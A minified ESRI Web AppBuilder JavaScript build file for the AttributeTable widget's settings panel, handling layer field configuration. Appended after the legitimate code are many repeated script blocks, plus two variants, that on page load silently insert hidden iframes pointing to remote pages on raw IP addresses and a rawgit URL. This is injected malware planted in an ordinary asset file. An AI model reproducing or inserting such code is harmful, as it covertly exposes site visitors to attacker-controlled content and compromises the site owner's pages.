// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/AttributeTable/utils":function(){define("dojo/_base/lang dojo/_base/array jimu/LayerInfos/LayerInfos dojo/Deferred dojo/promise/all exports dojo/store/Observable dojo/store/Cache dojo/store/Memory esri/lang ./table/FeatureLayerQueryStore jimu/utils".split(" "),function(h,m,r,q,g,f,e,t,l,u,w,n){function v(a,d){if(!a||!a.length)return d||[];if(!d||!d.length)return a;for(var k=[],b=0,c=a.length;b<c;b++)for(var p=a[b],e=0,f=d.length;e<f;e++)if(d[e].name===p.name){k.push(p);break}return k}
f.readLayerInfosObj=function(a){return r.getInstance(a,a.itemInfo)};f.readLayerInfosFromMap=function(a,d,k){var b=new q;r.getInstance(a,a.itemInfo).then(h.hitch(this,function(c){var p=[];d?c.traversalLayerInfosOfWebmap(function(b){p.push(b)}):c.traversal(function(b){p.push(b)});if(k){var a=[],e=c.getMapNotesLayerInfoArray();m.forEach(e,function(b){a.push(b.id);b.traversal(function(b){a.push(b.id)})});p=m.filter(p,function(b){return-1===a.indexOf(b.id)})}c=c.getTableInfoArray();p=p.concat(c);b.resolve(p)}),
h.hitch(this,function(c){console.error(c);b.reject(c)}));return b.promise};f.generateColumnsFromFields=function(a,d,k,b,c,p){function e(b){if(a&&u.isDefined(a.fieldInfos))for(var c=0,k=a.fieldInfos.length;c<k;c++){var p=a.fieldInfos[c];if(p.fieldName===b)return p.format}return null}var g={selectionHandle:{label:"",className:"selection-handle-column",hidden:!1,unhidable:!0,filed:"selection-handle-column",sortable:!1,_cache:{sortable:!1,statistics:!1}}};m.forEach(d,h.hitch(f,function(a,d,x){d="field"+
d;var l=!!a.domain,t="esriFieldTypeDate"===a.type,n=k&&a.name===k,y="esriFieldTypeDouble"===a.type||"esriFieldTypeSingle"===a.type||"esriFieldTypeInteger"===a.type||"esriFieldTypeSmallInteger"===a.type,q="esriFieldTypeString"===a.type;g[d]={label:a.alias||a.name,className:d,hidden:1===x.length?!1:!a.show&&u.isDefined(a.show),unhidable:1===x.length?!1:!a.show&&u.isDefined(a.show)&&a._pk,field:a.name,sortable:!1,_cache:{sortable:!!c,statistics:p&&!l&&y}};q?g[d].formatter=h.hitch(f,f.urlFormatter):t?
g[d].formatter=h.hitch(f,f.dateFormatter,e(a.name)):y&&(g[d].formatter=h.hitch(f,f.numberFormatter,e(a.name)));l?g[d].get=h.hitch(f,function(b,a){return this.getCodeValue(b.domain,a[b.name])},a):n?g[d].get=h.hitch(f,function(b,a,c){return this.getTypeName(c[b.name],a)},a,b):l||t||n||(g[d].get=h.hitch(f,function(b,a,c,k){var d=null;a&&c&&0<c.length&&(c=(c=m.filter(c,h.hitch(f,function(b){return b.id===k[a]})))&&c[0]||null)&&c.domains&&c.domains[b.name]&&c.domains[b.name].codedValues&&(d=this.getCodeValue(c.domains[b.name],
k[b.name]));return(b=null!==d?d:k[b.name])||isFinite(b)?b:""},a,k,b))}));return g};f.getTypeName=function(a,d){return n.fieldFormatter.getTypeName(a,d)};f.getCodeValue=function(a,d){return n.fieldFormatter.getCodedValue(a,d)};f.urlFormatter=function(a){return n.fieldFormatter.getFormattedUrl(a)};f.dateFormatter=function(a,d){return n.fieldFormatter.getFormattedDate(d,a)};f.numberFormatter=function(a,d){return n.fieldFormatter.getFormattedNumber(d,a)};f.readLayerObjectsFromMap=function(a,d,k){var b=
new q,c=[];this.readLayerInfosFromMap(a,d,k).then(h.hitch(this,function(a){m.forEach(a,h.hitch(this,function(b){c.push(b.getLayerObject())}));g(c).then(h.hitch(this,function(a){b.resolve(a)}),h.hitch(this,function(a){b.reject(a);console.error(a)}))}),h.hitch(this,function(a){b.reject(a)}));return b.promise};f.readSupportTableInfoFromLayerInfos=function(a){var d=new q,k=[];m.forEach(a,h.hitch(this,function(b){k.push(b.getSupportTableInfo())}));g(k).then(h.hitch(this,function(b){b=h.clone(b);m.forEach(b,
function(b,k){b.id=a[k].id});d.resolve(b)}),function(b){d.reject(b)});return d.promise};f.readConfigLayerInfosFromMap=function(a,d,k){var b=new q,c=[];this.readLayerInfosFromMap(a,d,k).then(h.hitch(this,function(a){var k=[];m.forEach(a,function(b){c.push(b.getSupportTableInfo())});g(c).then(h.hitch(this,function(c){m.forEach(c,h.hitch(this,function(b,c){b.isSupportedLayer&&(a[c].name=a[c].title,k.push(a[c]))}));b.resolve(k)}),h.hitch(this,function(a){b.reject(a)}))}),h.hitch(this,function(a){b.reject(a)}));
return b.promise};f.getConfigInfosFromLayerInfos=function(a){return m.map(a,function(a){return f.getConfigInfoFromLayerInfo(a)})};f.getConfigInfoFromLayerInfo=function(a){var d={};d.name=a.name||a.title;d.id=a.id;d.show=a.isShowInMap();d.layer={url:a.getUrl()};var k=a.getPopupInfo();k&&!k.description&&(d.layer.fields=m.map(k.fieldInfos,function(b){return{name:b.fieldName,alias:b.label,show:b.visible,format:b.format}}),a=h.getObject("layerObject.fields",!1,a),d.layer.fields=v(d.layer.fields,a),m.some(d.layer.fields,
function(b){return b.show})||(d.layer.fields&&0<d.layer.fields.length?d.layer.fields[0].show=!0:console.warn("We do not get fields info.")));return d};f.generateCacheStore=function(a,d,k,b,c){a=new w({layer:a,objectIds:a._objectIds||null,totalCount:d,batchCount:k,where:b||"1\x3d1",spatialFilter:c});d=new l;return new t(a,d,{})};f.generateMemoryStore=function(a,d){return new e(new l({data:a||[],idProperty:d}))};f.merge=function(a,d,k,b){for(var c=m.map(d,function(b){return b[k]}),p=0,e=a.length;p<
e;p++){var f=c.indexOf(a[p][k]);-1<f&&b(a[p],d[f])}};f.syncOrderWith=function(a,d,k){function b(b,a){return m.map(b,function(b){return b[a]})}if(!h.isArray(d)||!k)return a;for(var c=b(a,k),p=[],e=0,f=d.length;e<f;e++){var g=c.indexOf(d[e][k]);-1<g&&(p=p.concat(a.splice(g,1)),c=b(a,k))}return p.concat(a)}})},"dojo/store/Cache":function(){define(["../_base/lang","../when"],function(h,m){var r=function(q,g,f){f=f||{};return h.delegate(q,{query:function(e,h){e=q.query(e,h);e.forEach(function(e){f.isLoaded&&
!f.isLoaded(e)||g.put(e)});return e},queryEngine:q.queryEngine||g.queryEngine,get:function(e,f){return m(g.get(e),function(l){return l||m(q.get(e,f),function(f){f&&g.put(f,{id:e});return f})})},add:function(e,f){return m(q.add(e,f),function(l){g.add(l&&"object"==typeof l?l:e,f);return l})},put:function(e,f){g.remove(f&&f.id||this.getIdentity(e));return m(q.put(e,f),function(l){g.put(l&&"object"==typeof l?l:e,f);return l})},remove:function(e,f){return m(q.remove(e,f),function(l){return g.remove(e,
f)})},evict:function(e){return g.remove(e)}})};h.setObject("dojo.store.Cache",r);return r})},"widgets/AttributeTable/table/FeatureLayerQueryStore":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array esri/tasks/query esri/tasks/QueryTask ./FeatureLayerQueryResult".split(" "),function(h,m,r,q,g,f){return h(null,{queryUrl:"",idProperty:"id",data:null,_entityData:null,constructor:function(e){h.safeMixin(this,e);this.data=[];this._entityData=[];this.layer=e.layer;this.objectIds=e.objectIds;
this.where=e.where;this.orderByFields=e.orderByFields;this.totalCount=e.totalCount;this.batchCount=e.batchCount||25;this.idProperty=this.layer.objectIdField;this.spatialFilter=e.spatialFilter;this.layer&&this.layer.url&&(this.queryTask=new g(this.layer.url))},get:function(e){return this.data[e]},getIdentity:function(e){return e[this.idProperty]},query:function(e,g){var l=new q,h=g&&g.start||0,t=g._export_count||this.batchCount,n=null;"function"===typeof e?n=e(this._entityData):"[object Array]"===
Object.prototype.toString.call(e)&&(n=e);this.objectIds?(n=n?n:this.objectIds,l.objectIds=n.length>=h+this.batchCount?n.slice(h,h+t):n.slice(h)):(n&&0<n.length?l.objectIds=n.length>=h+this.batchCount?n.slice(h,h+t):n.slice(h):(l.start=h,l.num=t,l.where=this.where,l.geometry=this.spatialFilter,l.spatialRelationship=q.SPATIAL_REL_INTERSECTS),(e=g.sort)&&0<e.length&&(e=r.map(e,function(a){return a.attribute+" "+(a.descending?"DESC":"ASC")}),l.orderByFields=e));l.returnGeometry="esriGeometryPoint"===
this.layer.geometryType;l.outFields=["*"];var v=this.totalCount;e=null;e=!l.where;if(!(l.objectIds&&0<l.objectIds.length)&&e)return new f([]);e=this.queryTask?this.queryTask.execute(l):this.layer.queryFeatures(l);e.total=e.then(m.hitch(this,function(a){var d=0,k=this.layer.objectIdField;if(this.objectIds){if(!k)for(d=0;d<a.fields.length;d++)if("esriFieldTypeOID"===a.fields[d].type){k=a.fields[d].name;break}for(var b={},d=0;d<a.features.length;d++)b[a.features[d].attributes[k]]=a.features[d];a.features=
r.map(l.objectIds,function(a){return b[a]})}for(d=0;d<a.features.length;d++)if(a.features[d]){var c=a.features[d];a.features[d]=m.mixin(m.clone(c.attributes),{geometry:c.geometry});this.data[a.features[d][k]]=a.features[d];this._entityData.push(a.features[d])}a=a.features;return v}),function(){console.log("FeatureLayerQueryStore queryFeatures failed.");return 0});return new f(e)}})})},"widgets/AttributeTable/table/FeatureLayerQueryResult":function(){define("esri/main dojo/_base/lang dojo/_base/kernel dojo/_base/Deferred dojo/DeferredList dojo/_base/array".split(" "),
function(h,m,r,q){var g=function(f){function e(e){f[e]||(f[e]=function(){var h=arguments;return q.when(f,function(f){Array.prototype.unshift.call(h,f.features||f);return g(r[e].apply(r,h))})})}if(!f)return f;f.then&&(f=m.delegate(f));f.total||(f.total=q.when(f,function(e){return h._isDefined(e.total)?e.total:e.length||0}));e("forEach");e("filter");e("map");e("some");e("every");return f};return g})},"widgets/AttributeTable/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html",
"dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/AttributeTable/setting/Setting.html":'\x3cdiv style\x3d"width:100%;"\x3e\r\n  \x3cdiv class\x3d"instruction"\x3e\r\n    \x3cp\x3e${nls.instruction}\x3c/p\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"tableLayerInfos" class\x3d"table-layer-infos"\x3e\x3c/div\x3e\r\n  \x3cdiv class\x3d"table-options jimu-ellipsis"\x3e\r\n    \x3cul\x3e\r\n      \x3cli\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"exportcsv" checked\r\n        data-dojo-type\x3d"jimu/dijit/CheckBox" label\x3d"${nls.exportCSV}"\x3e\x3c/div\x3e\r\n      \x3c/li\x3e\r\n      \x3cli\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"expand" data-dojo-type\x3d"jimu/dijit/CheckBox" label\x3d"${nls.expand}"\x3e\x3c/div\x3e\r\n      \x3c/li\x3e\r\n      \x3cli\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"filterByMapExtent" data-dojo-type\x3d"jimu/dijit/CheckBox" label\x3d"${nls.filterByExtent}"\x3e\x3c/div\x3e\r\n      \x3c/li\x3e\r\n    \x3c/ul\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/AttributeTable/setting/css/style.css":".jimu-widget-attributetable-setting{margin:0; padding:0; font-size:14px; width: 100%; height: 100%; position: relative; color: #596679;}.jimu-widget-attributetable-setting .instruction{font-size: 12px; margin-bottom: 10px;}.jimu-widget-attributetable-setting .show{width: 120px;}.jimu-widget-attributetable-setting .symbol{width: 200px;}.jimu-widget-attributetable-setting .table-layer-infos{width: 100%; height: 240px;}.jimu-widget-attributetable-setting .table-options ul{list-style-type: none; padding: 0;}.jimu-widget-attributetable-setting .jimu-checkbox{margin-right: 20px;}.jimu-widget-attributetable-setting .disable-checkbox{color: #e5e5e5;}",
"*now":function(h){h(['dojo/i18n!*preload*widgets/AttributeTable/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/Deferred dojo/query jimu/dijit/Popup jimu/dijit/Message jimu/dijit/CheckBox jimu/dijit/LoadingShelter ../utils".split(" "),function(h,m,r,q,g,f,e,t,l,u,w,n,v,a,d){return h([r,m],{baseClass:"jimu-widget-attributetable-setting",currentFieldTable:null,_allLayerFields:null,_layerInfos:null,_tableInfos:null,_delayedLayerInfos:null,_delayedLayerInfosAfterInit:null,
_unSpportQueryCampsite:null,startup:function(){this.inherited(arguments);this.config.layerInfos||(this.config.layerInfos=[]);this._allLayerFields=[];this._layerInfos=[];this._tableInfos=[];this._delayedLayerInfos=[];this._delayedLayerInfosAfterInit=[];this._unSpportQueryCampsite={};this.displayFieldsTable=new q({fields:[{name:"show",title:this.nls.show,width:"auto",type:"checkbox","class":"show"},{name:"label",title:this.nls.label,width:"60%",type:"text"},{name:"url",title:"url",type:"text",hidden:!0},
{name:"index",title:"index",type:"text",hidden:!0},{name:"actions",title:this.nls.actions,type:"actions",width:"20%",actions:["edit"],"class":"symbol"},{name:"showAttachments",title:"",type:"checkbox",hidden:!0}],selectable:!0,autoHeight:!1});this.displayFieldsTable.placeAt(this.tableLayerInfos);f.setStyle(this.displayFieldsTable.domNode,{height:"100%"});this.shelter=new a({hidden:!0});this.shelter.placeAt(this.domNode.parentNode.parentNode||this.domNode);this.shelter.startup();this.shelter.show();
d.readLayerInfosObj(this.map).then(g.hitch(this,function(a){this.own(a.on("layerInfosChanged",g.hitch(this,this.onLayerInfosChanged)));this.own(t(this.displayFieldsTable,"actions-edit",g.hitch(this,this.editFieldsClick)));this.own(t(this.displayFieldsTable,"row-click",g.hitch(this,this._verifiedOnShowClick)));this.setConfig(this.config)}))},editFieldsClick:function(a){var b=u(".action-item-parent",a);if(b&&b.length)if(b=this.displayFieldsTable.getRowData(a),b.show){var c=parseInt(b.index,10);this.shelter.show();
this._getLayerFields(c).then(g.hitch(this,function(b){this.openFieldsDialog(a,b,c)}),g.hitch(this,function(b){console.error(b)})).always(g.hitch(this,function(){this.shelter.hide()}))}else var k=new n({message:this.nls.warning,buttons:[{label:this.nls.ok,onClick:g.hitch(this,function(){k.close()})}]})},_verifiedOnShowClick:function(a){var b=this.displayFieldsTable.getRowData(a),c=parseInt(b.index,10),k=null,k=this.config&&this.config.layerInfos&&0<this.config.layerInfos.length?this.config.layerInfos[c]:
this._layerInfos[c],c=-1<this._unSpportQueryCampsite.layerNames.indexOf(k.name||k.title);b.show&&c&&(new n({message:this.nls.unsupportQueryWarning}),b.show=!1,this.displayFieldsTable.editRow(a,b))},_getLayerFields:function(a){return this._layerInfos[a].getLayerObject().then(g.hitch(this,function(b){var c=this._allLayerFields[a];b=e.map(b.fields,function(b){return{name:b.name,alias:b.alias,show:!0}});d.merge(b,c,"name",function(b,a){g.mixin(b,a)});return b=d.syncOrderWith(b,c,"name")}))},openFieldsDialog:function(a,
b,c){var k=!1,d=this._layerInfos[c];(d=d&&d.layerObject)&&(k=d.hasAttachments&&d.objectIdField);var d=f.create("div"),e=this._createFieldsTable(b,c);f.place(e.domNode,d);var h=null;k&&(h=new v({label:this.nls.showAttachments,style:"margin-top:10px;"}),b=this.displayFieldsTable.getRowData(a),h.setValue(b.showAttachments),h.placeAt(d));this.currentFieldTable=e;b=600;h&&(b=640);var l=new w({titleLabel:this.nls.configureLayerFields,width:640,maxHeight:b,autoHeight:!0,content:d,buttons:[{label:this.nls.ok,
onClick:g.hitch(this,function(){this._allLayerFields[c]=e.getData();var b=h?h.getValue():!1;this.displayFieldsTable.editRow(a,{showAttachments:b});l.close();l=null})},{label:this.nls.cancel,classNames:["jimu-btn-vacation"],onClick:g.hitch(this,function(){l.close();l=null})}],onClose:function(){l=null}});e.startup()},_createFieldsTable:function(a){for(var b=null,c={fields:[{name:"show",title:this.nls.fieldVisibility,type:"checkbox","class":"show",onChange:g.hitch(this,function(a){var c=b.getData();
!e.some(c,g.hitch(this,function(a){return a.show}))&&(new n({message:this.nls.fieldCheckWarning}),c=b.getRowData(a))&&(c.show=!0,b.editRow(a,c))})},{name:"name",title:this.nls.fieldName,type:"text"},{name:"alias",title:this.nls.fieldAlias,editable:!0,type:"text"},{name:"actions",title:this.nls.fieldActions,type:"actions",actions:["up","down"],"class":"symbol"}],selectable:!0,autoHeight:!1,style:{height:"300px",maxHeight:"300px"}},b=new q(c),c=0;c<a.length;c++)a[c].show=void 0===a[c].show?!0:!!a[c].show,
b.addRow(a[c]);return b},setConfig:function(a){this.config=a;this.displayFieldsTable.clear();this._allLayerFields=[];this._processTableData().then(g.hitch(this,function(a){this._init(a);this.shelter.hide()}),g.hitch(this,function(a){new n({message:a.message||a})}))},onLayerInfosChanged:function(a,b,c){"added"===b&&c&&a&&c.getSupportTableInfo().then(g.hitch(this,function(a){a.isSupportedLayer&&(this._layerInfos&&0===this._layerInfos.length?this._delayedLayerInfos.push(c):this._layerInfos&&0<this._layerInfos.length&&
!this._getLayerInfoById(c.id)&&(this._delayedLayerInfosAfterInit.push(c),this._processDelayedLayerInfosAfterInit(this._delayedLayerInfosAfterInit)))}))},_processDelayedLayerInfosAfterInit:function(a){for(var b=this._layerInfos.length,c=0;c<a.length;c++){var e=d.getConfigInfoFromLayerInfo(a[c]);this.displayFieldsTable.addRow({label:e.name||e.title,url:e.layer.url,index:""+(b+c),show:e.show});this._allLayerFields.push(e.layer.fields);this._layerInfos.push(a[c])}},_processDelayedLayerInfos:function(){0<
this._delayedLayerInfos.length&&(e.forEach(this._delayedLayerInfos,g.hitch(this,function(a){this._getLayerInfoById(a.id)||this._layerInfos.push(a)})),this._delayedLayerInfos=[])},_processTableData:function(){var a=new l;d.readConfigLayerInfosFromMap(this.map,!0,!0).then(g.hitch(this,function(b){this._layerInfos=b;this._processDelayedLayerInfos();d.readSupportTableInfoFromLayerInfos(this._layerInfos).then(g.hitch(this,function(c){this._tableInfos=c;this.config&&this.config.layerInfos&&0<this.config.layerInfos.length?
(c=d.getConfigInfosFromLayerInfos(this._layerInfos),d.merge(c,this.config.layerInfos,"id",g.hitch(this,function(a,b){a.show=b.show;a.showAttachments=b.showAttachments;a.layer.url=b.layer.url;g.getObject("layer.fields.length",!1,a)&&g.getObject("layer.fields.length",!1,b)?(d.merge(a.layer.fields,b.layer.fields,"name",function(a,b){g.mixin(a,b)}),a.layer.fields=d.syncOrderWith(a.layer.fields,b.layer.fields,"name")):a.layer.fields=b.layer.fields})),this.config.layerInfos=c,this._unSpportQueryCampsite.fromConfig=
!0,this._unSpportQueryCampsite.layerNames=this._getUnsupportQueryLayerNames(this.config.layerInfos),a.resolve(c)):(this._unSpportQueryCampsite.fromConfig=!1,this._unSpportQueryCampsite.layerNames=this._getUnsupportQueryLayerNames(this._layerInfos),a.resolve(d.getConfigInfosFromLayerInfos(b)))}),function(b){console.error(b);a.reject(b)})}),g.hitch(this,function(b){console.error(b);a.reject(b)}));return a},_getUnsupportQueryLayerNames:function(a){var b=[];e.forEach(a,g.hitch(this,function(a){var c=
this._getSupportTableInfoById(a.id);c&&!c.isSupportQuery&&b.push(a.name||a.title)}));return b},_init:function(a){for(var b=[],c=0;c<a.length;c++){var d=a[c].show&&this._getSupportTableInfoById(a[c].id).isSupportQuery;this.displayFieldsTable.addRow({label:a[c].name||a[c].title,url:a[c].layer.url,index:""+c,show:d,showAttachments:!!a[c].showAttachments});this._allLayerFields.push(a[c].layer.fields);this._unSpportQueryCampsite.fromConfig&&(d=(d=this._unSpportQueryCampsite.layerNames)&&-1<d.indexOf(a[c].name||
a[c].title),a[c].show&&d&&b.push(a[c].name||a[c].title))}this._unSpportQueryCampsite.fromConfig&&0<b.length&&new n({message:this.nls.unsupportQueryLayers+"\x3cbr\x3e\x3cbr\x3e"+b.toString()});this.config.hideExportButton?this.exportcsv.uncheck():this.exportcsv.check();this.config.initiallyExpand?this.expand.check():this.expand.uncheck();this._canUseOpenAtStart()&&(this.openAtStart?this.expand.check():this.expand.uncheck(),this.expand.status=!1,f.addClass(this.expand.domNode,"disable-checkbox"));this.config.filterByMapExtent?
this.filterByMapExtent.check():this.filterByMapExtent.uncheck()},_canUseOpenAtStart:function(){return this.closeable||!this.isOnScreen},_getLayerInfoById:function(a){for(var b=0,c=this._layerInfos.length;b<c;b++)if(this._layerInfos[b].id===a)return this._layerInfos[b]},_getSupportTableInfoById:function(a){for(var b=0,c=this._tableInfos.length;b<c;b++)if(this._tableInfos[b].id===a)return this._tableInfos[b]},getConfig:function(){var a=this.displayFieldsTable.getData(),b=[],c=a.length;if(this.config&&
this.config.layerInfos&&0<this.config.layerInfos.length)e.forEach(a,g.hitch(this,function(d,c){d=this.config.layerInfos[c];var e={};e.name=d.name||d.title;e.id=d.id;e.layer={};e.layer.url=a[c].url;e.layer.fields=this._allLayerFields[c];e.show=a[c].show;e.showAttachments=a[c].showAttachments;b.push(e)}));else for(var d=0;d<c;d++){var f={};f.name=this._layerInfos[d].name||this._layerInfos[d].title;f.id=this._layerInfos[d].id;f.layer={};f.layer.url=a[d].url;f.layer.fields=this._allLayerFields[d];f.show=
a[d].show;f.showAttachments=a[d].showAttachments;b.push(f)}this.config.layerInfos=b;this.config.hideExportButton=!this.exportcsv.getValue();this.config.filterByMapExtent=this.filterByMapExtent.getValue();this._canUseOpenAtStart()||(this.config.initiallyExpand=this.expand.getValue());return this.config}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});